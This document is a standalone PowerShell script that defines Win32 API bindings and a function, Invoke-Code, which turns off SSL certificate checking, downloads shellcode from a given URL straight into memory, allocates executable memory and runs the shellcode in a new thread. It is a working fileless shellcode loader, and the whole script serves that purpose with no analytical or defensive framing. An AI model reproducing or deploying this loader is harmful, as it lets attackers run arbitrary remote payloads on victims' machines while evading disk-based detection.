$Win32API = @"
using System;
using System.Runtime.InteropServices;

public class Win32 {
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr GetCurrentProcess();
}
"@

# Add Win32 API type definition if it doesn't exist
if (-not ([System.Management.Automation.PSTypeName]"Win32").Type) {
    Add-Type -TypeDefinition $Win32API
}

function Invoke-Code {
    param(
        [Parameter(Mandatory=$true)]
        [string]$Url
    )

    try {
        # Bypass SSL certificate validation if needed
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }

        # Download shellcode directly into memory
        $webClient = New-Object System.Net.WebClient
        $code = $webClient.DownloadData($Url)

        # Allocate executable memory
        $memoryAddress = [Win32]::VirtualAlloc([IntPtr]::Zero, [uint32]$code.Length, 0x3000, 0x40)
        
        if ($memoryAddress -eq [IntPtr]::Zero) {
            throw "Failed to allocate memory"
        }

        # Copy shellcode to allocated memory
        [System.Runtime.InteropServices.Marshal]::Copy($code, 0, $memoryAddress, $code.Length)

        # Create and execute thread
        $threadHandle = [Win32]::CreateThread([IntPtr]::Zero, 0, $memoryAddress, [IntPtr]::Zero, 0, [IntPtr]::Zero)
        
        if ($threadHandle -eq [IntPtr]::Zero) {
            throw "Failed to create thread"
        }

        # Wait for thread to complete
        [Win32]::WaitForSingleObject($threadHandle, 0xFFFFFFFF) | Out-Null
    }
    catch {
        Write-Error "Error: $_"
    }
    finally {
        # Reset certificate validation callback
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = $null
    }
}

